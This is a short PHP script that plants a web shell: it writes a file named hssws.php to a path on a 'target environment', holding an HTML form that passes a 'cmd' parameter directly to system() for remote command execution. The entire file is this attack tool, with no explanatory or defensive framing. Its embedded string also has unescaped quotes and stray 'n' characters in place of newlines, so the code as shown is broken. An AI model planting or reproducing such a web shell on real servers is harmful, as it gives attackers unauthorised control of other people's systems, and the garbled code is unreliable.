<?php
  # Make sure to update the path as appropriate to the target environment
  $newShell="/path/to/hssws.php";
  $shellCode="<HTML><BODY>n<FORM METHOD="GET" NAME="myform" ACTION="">n<INPUT TYPE="text" NAME="cmd">n<INPUT TYPE="submit" VALUE="Send">n</FORM>n<pre>n<? if($_GET['cmd']) { system($_GET['cmd']); }?> n</pre>n</BODY> </HTML>";
  file_put_contents($newShell, $shellCode);
?>
